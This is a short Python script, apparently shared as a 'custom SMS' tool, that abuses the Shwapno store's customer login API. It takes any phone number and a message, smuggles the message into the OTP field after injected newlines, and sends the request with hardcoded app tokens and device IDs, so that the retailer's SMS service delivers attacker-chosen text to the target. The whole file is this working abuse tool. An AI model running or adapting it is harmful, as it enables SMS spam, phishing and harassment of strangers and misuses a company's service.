import requests
import base64
import logging
import time

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
#logo
print("""\033[38;5;46m
DEVELOPER : MR.PROFESSOR
TELEGRAM  : https://t.me/professor4498
VERSION   :1..0
PROJECT   : HALF CUSTOM SMS
FACEBOOK  : JUST SHUVO
××××××××××××××××××××××××××××××××××××××××××××""")
# Input from the user
n = input('Number => ')
m = input('Message => ')
custom_user_agent = input('Custom User-Agent (leave empty for default) => ')

# Developer name (obfuscated)
dev_name = base64.b64decode('TVVFSUQgTVVSU0FMSU4gUklGQVQ=').decode('utf-8')

# API endpoint
url = "https://store-api.shwapno.com/en/api/customer/login"

# Data to be sent in the POST request
data = {
    "phoneNumber": n,
    "otpHash": "\n\n\n\n\n" + m
}

# Headers for the request
headers = {
    "user-agent": custom_user_agent if custom_user_agent else "shwapno.flutter",
    "accept-encoding": "gzip",
    "nst": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJOU1RfS0VZIjoiYm05d1UzUmhkR2x2YmxSdmEyVnUiLCJleHAiOjE3MjM5MTI1NTMsImlhdCI6MTcyMzgyNjE1M30.QGPgM5BvH0R2XBmbAEhPwxts0nZM1Ue8Tm8vmTdB7NE",
    "content-length": str(len(data)),
    "client-type": "App",
    "host": "store-api.shwapno.com",
    "content-type": "application/json",
    "customer": "f7f1ffa2-1200-48e5-9434-b55da46a8981",
    "device-type": "Mobile",
    "appdevicetoken": "f7f1ffa2-1200-48e5-9434-b55da46a8981"
}

# Retry mechanism
retries = 3
for attempt in range(retries):
    try:
        response = requests.post(url, headers=headers, json=data)
        response.raise_for_status()
        logging.info("Request successful")
        break
    except requests.exceptions.RequestException as e:
        logging.error(f"Attempt {attempt + 1} failed: {str(e).split(' ')[0]}")
        if attempt < retries - 1:
            time.sleep(2)
        else:
            logging.critical("All attempts failed.")
            print("Failed to send the request. Please try again later.")

# Output the response from the server
print(response.text)

# Developer name revealed during execution
print(f"Developed by {dev_name}")

#tool:Half custom sms🫡